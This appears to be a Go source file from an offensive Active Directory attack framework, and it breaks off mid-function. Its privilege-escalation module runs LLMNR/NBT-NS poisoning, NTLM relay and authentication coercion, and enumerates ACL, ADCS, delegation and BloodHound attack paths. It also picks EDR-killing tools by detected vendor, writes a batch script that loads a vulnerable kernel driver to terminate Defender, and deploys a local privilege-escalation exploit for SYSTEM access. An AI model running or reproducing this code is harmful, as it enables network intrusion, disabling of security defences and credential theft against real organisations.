package modules

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"adpack/core"
	"adpack/internal/bloodhound"
	"adpack/internal/resolver"
	"adpack/internal/resolver/cert"
	"adpack/planner"
	"adpack/tools"
	"adpack/utils"
)

type DeltaClass int

const (
	DeltaNone DeltaClass = iota
	DeltaCredential
	DeltaEdge
	DeltaPath
	DeltaNoise
)

func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, executePaths bool) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target for privilege escalation checks")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for privesc")
		result.Success = false
		return result
	}

	maxIter := 5

	for iter := 0; iter < maxIter; iter++ {
		credsBefore := len(state.Creds)
		edgesBefore := len(state.Edges)

		exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// ── Runtime services (Responder + Relay, non-stealth only) ──
		var runtime core.RuntimeProvider
		relayEdges := make(chan core.PrivilegeEdge, 64)
		if RuntimeFactory != nil && !isStealthPolicy(evasionProfile) {
			runtime = RuntimeFactory()

			// Start Responder first (poisoner generates traffic)
			respCfg := core.ResponderConfig{
				ID:        "responder-main",
				Label:     "Responder Poisoner",
				Interface: "eth0",
				Verbose:   true,
				WPAD:      true,
			}
			if err := runtime.StartResponder(ctx, respCfg); err != nil {
				fmt.Printf("[!] Failed to start Responder: %v\n", err)
			} else {
				fmt.Printf("[+] Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)\n")
			}

			// Start relay as receiver
			relayCfg := core.RelayConfig{
				ID:          "ntlmrelayx-main",
				Label:       "NTLM Relay Listener",
				InterfaceIP: "0.0.0.0",
				Target:      "ldap://" + host.IP,
				SMBServer:   true,
				HTTPServer:  true,
			}
			if err := runtime.StartRelay(ctx, relayCfg); err != nil {
				fmt.Printf("[!] Failed to start relay: %v\n", err)
			} else {
				fmt.Printf("[+] NTLM relay started on 0.0.0.0 → ldap://%s\n", host.IP)
			}

			// Start coercer to trigger authentications
			coercerTargets := []string{host.IP}
			coercerCfg := core.CoercerConfig{
				ID:          "coercer-main",
				Label:       "Coercer Trigger",
				SourceLabel: host.IP,
				InterfaceIP: "0.0.0.0",
				Targets:     coercerTargets,
				Methods:     []string{},
				Delay:       120 * time.Second,
			}
			if err := runtime.StartCoercer(ctx, coercerCfg); err != nil {
				fmt.Printf("[!] Failed to start coercer: %v\n", err)
			} else {
				fmt.Printf("[+] Coercer started, targeting %d host(s)\n", len(coercerTargets))
			}

			// Stop all services on return
			defer runtime.StopAll()

			// Consume events from all services into edge channel
			go func() {
				for {
					select {
					case evt, ok := <-runtime.Events():
						if !ok {
							return
						}
						if edge := materializeEdgeFromEvent(evt); edge != nil {
							relayEdges <- *edge
						}
					case <-ctx.Done():
						// Drain any remaining events so senders don't block
						for {
							select {
							case _, ok := <-runtime.Events():
								if !ok {
									return
								}
							default:
								return
							}
						}
					}
				}
			}()

			// Attach artifact resolver pipeline (certipy → identity extraction)
			resolvers := []resolver.ArtifactResolver{&cert.CertResolver{}}
			resolver.AttachResolverPipeline(ctx, runtime, state, resolvers...)
		}

		// ── LDAP checks ──────────────────────────────────────────
		provider := NewNetExecProvider(core.ProviderConfig{
			Host: host.IP, Domain: domain,
			Username: user, Password: pass, Hash: hash,
		})

		// GPP passwords (quick nxc module check)
		fmt.Println("[*] Checking GPP passwords in SYSVOL...")
		gppR := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: host.IP, Domain: domain},
			Method: "ldap", Artifact: "-M", Arguments: []string{"gpp_password"},
			Timeout: 30 * time.Second,
		})
		if gppR.Success {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "gpp_password", Key: "status",
				Value: "GPP check complete", RawOutput: gppR.Output,
				Timestamp: time.Now(),
			})
		}

		// ADCS vulnerable template enumeration
		fmt.Println("[*] Checking ADCS vulnerable templates...")
		adcsR := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: host.IP, Domain: domain},
			Method: "ldap", Artifact: "-M", Arguments: []string{"adcs"},
			Timeout: 30 * time.Second,
		})
		if adcsR.Success {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "adcs", Key: "status",
				Value: "ADCS check complete", RawOutput: adcsR.Output,
				Timestamp: time.Now(),
			})
		}

		// RBCD check
		fmt.Println("[*] Checking RBCD...")
		rbcdR := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: host.IP, Domain: domain},
			Method: "ldap", Artifact: "-M", Arguments: []string{"rbcd"},
			Timeout: 30 * time.Second,
		})
		if rbcdR.Success {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "rbcd", Key: "status",
				Value: "RBCD check complete", RawOutput: rbcdR.Output,
				Timestamp: time.Now(),
			})
		}

		// ── ACL enumeration via daclread ──────────────────────────
		fmt.Println("[*] Enumerating ACL privilege edges (daclread)...")
		targets := highValueTargets(state)
		if len(targets) == 0 {
			// Fall back to common targets if state is sparse
			targets = []string{"Domain Admins", "Administrators", "Domain Controllers"}
		}

		edgeCount := 0
		for _, t := range targets {
			edges, err := provider.EnumerateACLs(ctx, t)
			if err != nil {
				fmt.Printf("[!] daclread failed for %s: %v\n", t, err)
				continue
			}
			if len(edges) > 0 {
				state.Edges = append(state.Edges, edges...)
				edgeCount += len(edges)
				fmt.Printf("[+] %d ACE(s) found on %s\n", len(edges), t)
				for _, e := range edges {
					fmt.Printf("      %s → %s → %s\n",
						e.SourcePrincipal, e.AccessRight, e.TargetPrincipal)
					result.Evidence = append(result.Evidence, core.EvidenceEntry{
						Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
						Source: "daclread", Key: e.SourcePrincipal,
						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
						Confidence: e.Confidence, Timestamp: time.Now(),
					})
				}
			}
		}

		// ── MSSQL impersonation edges ───────────────────────────
		fmt.Println("[*] Checking MSSQL impersonation privileges (mssql_priv)...")
		mssqlEdges, err := provider.EnumerateMSSQLImpersonations(ctx)
		if err != nil {
			fmt.Printf("[!] mssql_priv failed: %v\n", err)
		} else if len(mssqlEdges) > 0 {
			state.Edges = append(state.Edges, mssqlEdges...)
			edgeCount += len(mssqlEdges)
			fmt.Printf("[+] %d MSSQL privilege edge(s) found\n", len(mssqlEdges))
			for _, e := range mssqlEdges {
				fmt.Printf("      %s → %s → %s [exploit=%.1f noise=%.1f]\n",
					e.SourcePrincipal, e.AccessRight, e.TargetPrincipal,
					e.Exploitability, e.Noise)
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
					Source: "mssql_priv", Key: e.SourcePrincipal,
					Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
					Confidence: e.Confidence, Timestamp: time.Now(),
				})
			}
		} else {
			fmt.Println("[*] No MSSQL impersonation edges found")
		}

		// ── ADCS certificate template edges ──────────────────────
		fmt.Println("[*] Enumerating ADCS certificate templates (certipy-find)...")
		adcsTemplates, err := provider.EnumerateADCSTemplates(ctx)
		if err != nil {
			fmt.Printf("[!] certipy-find failed: %v\n", err)
		} else if len(adcsTemplates) > 0 {
			fmt.Printf("[+] %d ADCS template(s) found\n", len(adcsTemplates))
			for _, t := range adcsTemplates {
				if t.Vuln == "" {
					continue
				}
				adcsEdges := adcsEdgeSet(t, domain, host.IP, false)
				state.Edges = append(state.Edges, adcsEdges...)
				edgeCount += len(adcsEdges)
				if len(adcsEdges) > 0 {
					fmt.Printf("      %s [%s] → %d edge(s)\n",
						t.Name, t.Vuln, len(adcsEdges))
					for _, e := range adcsEdges {
						fmt.Printf("        %s → %s [exploit=%.1f noise=%.1f]\n",
							e.SourcePrincipal, e.TargetPrincipal,
							e.Exploitability, e.Noise)
						result.Evidence = append(result.Evidence, core.EvidenceEntry{
							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
							Source: "certipy-find", Key: e.SourcePrincipal,
							Value:      fmt.Sprintf("%s → %s [%s]", e.AccessRight, e.TargetPrincipal, t.Name),
							Confidence: e.Confidence, Timestamp: time.Now(),
						})
					}
				}
			}
		} else {
			fmt.Println("[*] No ADCS templates found")
		}

		// ── Relay capture edges ───────────────────────────────────
		if runtime != nil {
			drained := drainRelayEdges(relayEdges)
			if len(drained) > 0 {
				drained = dedupEdges(drained, state.Edges)
				if len(drained) > 0 {
					state.Edges = append(state.Edges, drained...)
					edgeCount += len(drained)
					fmt.Printf("[+] %d new relay capture edge(s) materialized\n", len(drained))
					for _, e := range drained {
						fmt.Printf("      %s → %s [%s]\n",
							e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
						result.Evidence = append(result.Evidence, core.EvidenceEntry{
							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
							Source: "ntlmrelayx", Key: e.SourcePrincipal,
							Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
							Confidence: e.Confidence, Timestamp: time.Now(),
						})
					}
				}
			}
			runtime.ApplyToState(state)
		}

		// ── Delegation edges (unconstrained, constrained, RBCD) ──
		fmt.Println("[*] Enumerating delegation relationships...")
		delegEdges, err := provider.EnumerateDelegation(ctx)
		if err != nil {
			fmt.Printf("[!] Delegation enumeration failed: %v\n", err)
		} else if len(delegEdges) > 0 {
			state.Edges = append(state.Edges, delegEdges...)
			edgeCount += len(delegEdges)
			fmt.Printf("[+] %d delegation edge(s) found\n", len(delegEdges))
			for _, e := range delegEdges {
				fmt.Printf("      %s → %s [%s]\n",
					e.SourcePrincipal, e.TargetPrincipal, e.AccessRight)
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
					Source: "delegation", Key: e.SourcePrincipal,
					Value:      fmt.Sprintf("%s → %s [%s]", e.SourcePrincipal, e.TargetPrincipal, e.AccessRight),
					Confidence: e.Confidence, Timestamp: time.Now(),
				})
			}
		} else {
			fmt.Println("[*] No delegation relationships found")
		}

		// ── BloodHound graph enrichment ────────────────────────────
		fmt.Println("[*] Enumerating BloodHound graph (bloodhound-python)...")
		bhDir, bhErr := os.MkdirTemp("", "adpack-bh-*")
		if bhErr == nil {
			defer os.RemoveAll(bhDir)
			bhCfg := bloodhound.CollectConfig{
				Domain:    domain,
				Username:  user,
				Password:  pass,
				Hash:      hash,
				DCHost:    host.Hostname + "." + domain,
				DNSHost:   host.IP,
				OutputDir: bhDir,
				Methods:   bloodhound.DefaultMethods,
			}
			if bhErr = bloodhound.CollectAndIngest(ctx, bhCfg, state); bhErr != nil {
				fmt.Printf("[!] BloodHound ingestion failed: %v\n", bhErr)
			} else {
				bhCount := len(state.Edges)
				bhTotal := 0
				for _, e := range state.Edges {
					if e.Source == "bloodhound" {
						bhTotal++
					}
				}
				fmt.Printf("[+] BloodHound merged: %d users, %d groups, %d computers, %d BH edges (total %d edges)\n",
					len(state.Users), len(state.Groups), len(state.Computers), bhTotal, bhCount)
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
					Source: "bloodhound", Key: "ingested",
					Value:     fmt.Sprintf("%d edges merged", bhTotal),
					Timestamp: time.Now(),
				})
			}
		} else {
			fmt.Printf("[!] Cannot create temp dir for BloodHound: %v\n", bhErr)
		}

		// ── Weighted path planning (baseline) ──────────────────────
		var availCaps []string
		if tools.NetExec.Available() {
			availCaps = append(availCaps, "nxc")
		}
		if runtime != nil {
			health := runtimeHealthSummary(runtime)
			fmt.Printf("[*] Runtime: %s\n", health)
		}
		baselinePlans := runPlanning(state, result, edgeCount, availCaps)

		// ── SUB-PHASE 1: Pre-evasion ──────────────────────────
		// UnDefend (no admin needed, blocks Defender updates).
		// Then PhantomKiller (needs admin, BYOVD EDR kill via BootRepair.sys).
		isBypass := IsBypassProfile(evasionProfile)
		if isBypass {
			runPreEvasion(ctx, state, host, exec, result)
		}

		// ── SUB-PHASE 2: SYSTEM check via smbexec → atexec ───
		gotSystem := false
		r := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: host.IP, Domain: domain},
			Method: "system_check", Timeout: 45 * time.Second,
		})
		if r.Success {
			fmt.Printf("[+] SYSTEM access confirmed on %s (%s)\n", host.IP, r.Method)
			gotSystem = true
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: r.Method, Key: host.IP, Value: "SYSTEM",
				Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
			})
		} else {
			fmt.Printf("[!] No SYSTEM context obtained on %s via smbexec/atexec\n", host.IP)
		}

		// ── SUB-PHASE 3: Local LPE chain (supplementary) ──────
		if !gotSystem {
			runLocalLPEChain(ctx, state, host, exec, result)
		}

		// ── Runtime edge drain + replanning ───────────────────────
		if cap(relayEdges) > 0 {
			drained := drainRelayEdges(relayEdges)
			if len(drained) > 0 {
				drained = dedupEdges(drained, state.Edges)
				if len(drained) > 0 {
					state.Edges = append(state.Edges, drained...)
					edgeCount += len(drained)
					fmt.Printf("[+] %d new runtime capture edge(s) materialized during execution\n", len(drained))
					for _, e := range drained {
						fmt.Printf("      %s → %s [%s] (conf=%.1f)\n",
							e.SourcePrincipal, e.TargetPrincipal, e.AccessRight, e.Confidence)
						result.Evidence = append(result.Evidence, core.EvidenceEntry{
							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
							Source: "runtime", Key: e.SourcePrincipal,
							Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
							Confidence: e.Confidence, Timestamp: time.Now(),
						})
					}
				}
			}
			if runtime != nil {
				runtime.ApplyToState(state)
				health := runtimeHealthSummary(runtime)
				fmt.Printf("[*] Runtime post-execution: %s\n", health)
			}
		}

		// Replan if new edges were added
		if edgeCount > 0 {
			newPlans := runPlanning(state, result, edgeCount, availCaps)
			if len(newPlans) > 0 && len(baselinePlans) > 0 {
				for target, plan := range newPlans {
					if old, ok := baselinePlans[target]; !ok || plan.TotalCost < old.TotalCost {
						fmt.Printf("  ⤴ Better path to %s: score %.1f (was %.1f)\n",
							target, plan.TotalCost, old.TotalCost)
					}
				}
			}
		}

		// ── Optional path execution ────────────────────────────
		if executePaths && len(baselinePlans) > 0 {
			fmt.Println("\n[*] Executing best planned paths (reconciliation-gated)...")
			ctx2, cancel2 := context.WithCancel(context.Background())
			defer cancel2()
			executed := ExecuteBestPaths(ctx2, state, baselinePlans, host.IP, result)
			if executed > 0 {
				fmt.Printf("[+] Path execution: %d steps completed\n", executed)
			}
		}

		// ── Edge confidence health summary ─────────────────────
		printConfidenceHealth(state.Edges)

		// ── Active re-verification of stale/degraded edges ────
		if executePaths {
			domain, user, pass, _ := getCredential(state)
			if domain != "" && user != "" {
				reVerified := ReVerifyEdges(ctx, state, domain, user, pass, host.IP, 5)
				if reVerified > 0 {
					fmt.Printf("[+] Re-verified %d stale/degraded edges against live AD\n", reVerified)
				}
			}
		}

		delta := classifyDelta(credsBefore, edgesBefore, state)
		fmt.Printf("[*] Privesc iteration %d/%d complete: delta=%v\n", iter+1, maxIter, delta)

		switch delta {
		case DeltaNone, DeltaNoise:
			return result
		case DeltaCredential:
			if hasValidatedDA(state) {
				return result
			}
		}
	}

	return result
}

// ── SUB-PHASE 1: Pre-Evasion ───────────────────────────────

var avPipelineMap = map[string]string{
	"windows defender":   "undefend",
	"defender":           "undefend",
	"sentinelone":        "phantomkiller",
	"sentinel one":       "phantomkiller",
	"crowdstrike":        "phantomkiller",
	"cylance":            "phantomkiller",
	"carbon black":       "coldwer",
	"carbonblack":        "coldwer",
	"sophos":             "coldwer",
	"tanium":             "phantomkiller",
	"microsoft defender": "undefend",
}

func selectAVPipeline(detected map[string]string) string {
	for av := range detected {
		avLower := strings.ToLower(av)
		for pattern, pipeline := range avPipelineMap {
			if strings.Contains(avLower, pattern) {
				return pipeline
			}
		}
	}
	return ""
}

func runPreEvasion(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	killTarget := host
	for _, h := range state.Hosts {
		if !h.IsDC {
			killTarget = h
			break
		}
	}

	// Check what AV/EDR is actually running on the target
	domain, user, pass, hash := getCredential(state)
	if domain != "" && user != "" {
		provider := NewNetExecProvider(core.ProviderConfig{
			Host: killTarget.IP, Domain: domain,
			Username: user, Password: pass, Hash: hash,
		})
		av, err := provider.EnumerateAV(ctx)
		if err == nil && len(av) > 0 {
			var names []string
			for name := range av {
				names = append(names, name)
			}
			avStr := strings.Join(names, ", ")
			fmt.Printf("[*] Detected EDR/AV on %s: %s\n", killTarget.IP, avStr)

			// Update host EDR field in state
			for i := range state.Hosts {
				if state.Hosts[i].IP == killTarget.IP {
					state.Hosts[i].EDR = avStr
					break
				}
			}

			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "enum_av", Key: killTarget.IP,
				Value: avStr, Confidence: 0.9, Timestamp: time.Now(),
			})

			// Select evasion pipeline based on what's detected
			pipeline := selectAVPipeline(av)
			switch pipeline {
			case "undefend":
				fmt.Printf("[*] Targeting %s with UnDefend pipeline\n", avStr)
				runUnDefendDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
			case "phantomkiller":
				if tools.PhantomKiller.Available() {
					fmt.Printf("[*] Targeting %s with PhantomKiller pipeline\n", avStr)
					runPhantomKiller(ctx, killTarget, exec, result)
				} else {
					fmt.Println("[!] PhantomKiller not available, trying UnDefend fallback")
					runUnDefendDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
				}
			case "coldwer":
				fmt.Printf("[*] Targeting %s with ColdWer pipeline\n", avStr)
				runColdWerDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
			default:
				fmt.Printf("[*] No specific pipeline for %s, trying PhantomKiller (best-effort)\n", avStr)
				if tools.PhantomKiller.Available() {
					runPhantomKiller(ctx, killTarget, exec, result)
				}
			}
		} else {
			fmt.Printf("[*] No AV/EDR detected on %s (or enum failed), skipping pre-evasion\n", killTarget.IP)
		}
	} else {
		fmt.Println("[!] No credentials for AV enumeration, running blind")
		if tools.PhantomKiller.Available() {
			runPhantomKiller(ctx, host, exec, result)
		}
	}

	fmt.Println("[*] Waiting 10s for EDR termination...")
	time.Sleep(10 * time.Second)
}

// runUnDefendDirect deploys UnDefend + nanodump against a specific target
func runUnDefendDirect(ctx context.Context, host core.Host, domain, user, pass, hash string, exec core.Executor, result *core.ToolResult) {
	if !tools.UnDefend.Available() {
		fmt.Println("[!] UnDefend.exe not found, skipping")
		return
	}

	remoteDir := `C:\Windows\Temp\`
	deployR := exec.Execute(ctx, core.Action{
		Artifact: "UnDefend.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !deployR.Success {
		fmt.Printf("[!] UnDefend deploy failed: %s\n", deployR.Error)
		return
	}
	remotePath := deployR.Output

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}
	killR, _ := tools.UnDefend.ExecRemote(ctx, target, remotePath, true)
	_ = killR

	exec.Execute(ctx, core.Action{
		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
	})

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "undefend", Key: host.IP, Value: "Defender killed (AV-guided)",
		Confidence: 0.85, Timestamp: time.Now(),
	})
}

// runColdWerDirect deploys EDR-Freeze + nanodump against a specific target
func runColdWerDirect(ctx context.Context, host core.Host, domain, user, pass, hash string, exec core.Executor, result *core.ToolResult) {
	remoteDir := `C:\Windows\Temp\`
	freezerR := exec.Execute(ctx, core.Action{
		Artifact: "EDR-Freeze.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !freezerR.Success {
		fmt.Println("[!] EDR-Freeze deploy failed, skipping")
		return
	}
	freezerPath := freezerR.Output

	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
		"Sophos.exe", "TaniumClient.exe", "CarbonBlack.exe"}
	for _, proc := range edrProcs {
		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
		pidR := exec.Execute(ctx, core.Action{
			Artifact: pidCmd, Method: "command", Timeout: 15 * time.Second,
		})
		if pidR.Success && strings.TrimSpace(pidR.Output) != "" {
			pid := strings.TrimSpace(pidR.Output)
			freezeCmd := fmt.Sprintf(`%s %s 3000`, freezerPath, pid)
			exec.Execute(ctx, core.Action{
				Artifact: freezeCmd, Method: "command", Timeout: 15 * time.Second,
			})
			fmt.Printf("[*] ColdWer: Froze %s PID %s for 3s\n", proc, pid)
			break
		}
	}

	exec.Execute(ctx, core.Action{
		Method: "cleanup", Arguments: []string{freezerPath}, Timeout: 15 * time.Second,
	})

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "coldwer", Key: host.IP, Value: "EDR freeze attempted (AV-guided)",
		Confidence: 0.75, Timestamp: time.Now(),
	})
}

func runPhantomKiller(ctx context.Context, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	domain := host.Domain
	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		if len(cleanups) > 0 {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: cleanups, Timeout: 30 * time.Second,
			})
		}
	}()

	batPath := deployAndExecPhantomKiller(ctx, exec, host, domain, remoteDir, &cleanups)
	if batPath == "" {
		return
	}

	execR := exec.Execute(ctx, core.Action{
		Artifact: batPath, Method: "command",
		Timeout: 60 * time.Second,
	})
	if execR.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: "phantomkiller", Key: host.IP, Value: "EDR terminated (BYOVD)",
			Confidence: 0.85, RawOutput: execR.Output, Timestamp: time.Now(),
		})
		fmt.Printf("[+] PhantomKiller: EDR kill attempted successfully on %s\n", host.IP)
	}
}

func deployAndExecPhantomKiller(ctx context.Context, exec core.Executor, host core.Host, domain, remoteDir string, cleanups *[]string) string {
	drvR := exec.Execute(ctx, core.Action{
		Artifact: "PhantomKiller.sys", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !drvR.Success {
		return ""
	}
	driverPath := drvR.Output
	*cleanups = append(*cleanups, driverPath)

	loaderR := exec.Execute(ctx, core.Action{
		Artifact: "PhantomKiller.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !loaderR.Success {
		return ""
	}
	loaderPath := loaderR.Output
	*cleanups = append(*cleanups, loaderPath)

	driverName := "PK_" + tools.RandString(4)
	batContent := fmt.Sprintf(
		`@echo off
setlocal enabledelayedexpansion
for /f "tokens=2 delims= " %%p in ('tasklist /fi "imagename eq MsMpEng.exe" /nh') do set PID=%%p
if "!PID!"=="" echo No Defender PID found && exit /b 0
sc.exe create %s binPath="%s" type=kernel
sc.exe start %s
%s !PID!
`, driverName, driverPath, driverName, loaderPath)

	batLocal := filepath.Join(os.TempDir(), "pk_"+tools.RandString(4)+".bat")
	if err := os.WriteFile(batLocal, []byte(batContent), 0644); err != nil {
		fmt.Printf("[!] PhantomKiller: failed to write batch file: %v\n", err)
		return ""
	}
	defer os.Remove(batLocal)

	batR := exec.Execute(ctx, core.Action{
		Artifact: batLocal, Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !batR.Success {
		return ""
	}
	batPath := batR.Output
	*cleanups = append(*cleanups, batPath)

	fmt.Printf("[*] PhantomKiller: loading driver and killing Defender on %s...\n", host.IP)
	return batPath
}

// ── SUB-PHASE 3: Local LPE ─────────────────────────────────

func runLocalLPEChain(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	if tools.MiniPlasma.Available() {
		runMiniPlasmaProbe(ctx, host, exec, result)
	}
}

func runMiniPlasmaProbe(ctx context.Context, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		if len(cleanups) > 0 {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: cleanups, Timeout: 30 * time.Second,
			})
		}
	}()

	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
		r := exec.Execute(ctx, core.Action{
			Artifact: lib, Method: "put",
			Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
		})
		if !r.Success {
			return
		}
		cleanups = append(cleanups, r.Output)
	}

	mpPut := exec.Execute(ctx, core.Action{
		Artifact: "MiniPlasma.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !mpPut.Success {
		return
	}
	mpPath := mpPut.Output
	cleanups = append(cleanups, mpPath)

	fmt.Printf("[*] MiniPlasma: executing Cloud Filter EoP on %s...\n", host.IP)
	execR := exec.Execute(ctx, core.Action{
		Artifact: mpPath, Method: "run",
		Timeout: 60 * time.Second,
	})
	if !execR.Success {
		fmt.Printf("[-] MiniPlasma EoP failed on %s\n", host.IP)
		return
	}

	fmt.Printf("[+] MiniPlasma: exploitation returned success on %s\n", host.IP)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "miniplasma", Key: host.IP, Value: "SYSTEM shell obtained",
		Confidence: 0.7, RawOutput: execR.Output, Timestamp: time.Now(),
	})

	sysR := exec.Execute(ctx, core.Action{
		Method: "system_check", Timeout: 45 * time.Second,
	})
	if sysR.Success {
		fmt.Printf("[+] MiniPlasma: SYSTEM confirmed on %s (%s)\n", host.IP, sysR.Method)
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: sysR.Method, Key: host.IP, Value: "SYSTEM (via MiniPlasma)",
			Confidence: 1.0, RawOutput: sysR.Output, Timestamp: time.Now(),
		})
	}
}

// runPlanning runs the weighted path planner and logs results.
// Returns a map of target → best ScoredPath for later comparison.
func runPlanning(state *core.ADState, result *core.ToolResult, edgeCount int, availCaps []string) map[string]planner.ScoredPath {
	plans := make(map[string]planner.ScoredPath)
	if edgeCount <= 0 {
		fmt.Println("[*] No privilege edges found to analyze")
		return plans
	}

	fmt.Println("[*] Planning weighted escalation paths (Dijkstra)...")
	cfg := planner.DefaultConfig()
	cfg.AvailableCaps = availCaps

	totalPlans := 0
	for _, cred := range state.Creds {
		if !cred.Validated {
			continue
		}
		startPrincipal := cred.Domain + "\\" + cred.Username
		paths := planner.New(state, cfg).PlanPaths(startPrincipal)
		for _, plan := range paths {
			totalPlans++
			// Keep the best (lowest cost) path per target
			if existing, ok := plans[plan.Target]; !ok || plan.TotalCost < existing.TotalCost {
				plans[plan.Target] = plan
			}
			fmt.Printf("  ── Plan %d: %s → %s ──\n",
				totalPlans, startPrincipal, plan.Target)
			fmt.Printf("      Score: %.1f (weight=%.1f, noise=%.1f) %s\n",
				plan.TotalCost, plan.TotalWeight, plan.TotalNoise, capsTag(plan.NeededCaps))
			for _, e := range plan.Steps {
				fmt.Printf("       %s → %s → %s [cost=%.1f noise=%.1f]\n",
					e.SourcePrincipal, e.AccessRight, e.TargetPrincipal,
					e.Weight, e.Noise)
			}
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "planner", Key: startPrincipal,
				Value:      fmt.Sprintf("→ %s (score=%.1f)", plan.Target, plan.TotalCost),
				Confidence: 0.7, RawOutput: formatScoredPath(plan, startPrincipal),
				Timestamp: time.Now(),
			})
		}
	}
	if totalPlans == 0 {
		fmt.Println("  No escalation path found from controlled principals (need more edges)")
	}
	return plans
}

func formatScoredPath(plan planner.ScoredPath, start string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "Score: %.1f | Weight: %.1f | Noise: %.1f", plan.TotalCost, plan.TotalWeight, plan.TotalNoise)
	if len(plan.NeededCaps) > 0 {
		fmt.Fprintf(&b, " | Missing: %s", strings.Join(plan.NeededCaps, ","))
	}
	b.WriteString("\n")
	for _, e := range plan.Steps {
		fmt.Fprintf(&b, "  %s → %s → %s [w=%.0f n=%.1f]\n",
			e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Weight, e.Noise)
	}
	return b.String()
}

func capsTag(caps []string) string {
	if len(caps) == 0 {
		return ""
	}
	return "[!missing:" + strings.Join(caps, ",") + "]"
}

// ExecutePlannedPath executes a single planned path step by step through the
// dispatch → reconcile → ApplyDelta → re-plan cycle. Returns the number of
// steps successfully executed.
func ExecutePlannedPath(ctx context.Context, state *core.ADState, plan planner.ScoredPath, domain, user, pass, hash, targetIP string, result *core.ToolResult) int {
	if len(plan.Steps) == 0 {
		return 0
	}

	fmt.Printf("\n[*] Executing planned path: %s → %s (score=%.1f)\n",
		plan.Steps[0].SourcePrincipal, plan.Target, plan.TotalCost)

	executed := 0
	for i, step := range plan.Steps {
		cap := core.AccessRightToCapability(step)
		fmt.Printf("  Step %d/%d: %s → %s via %s [%s]\n",
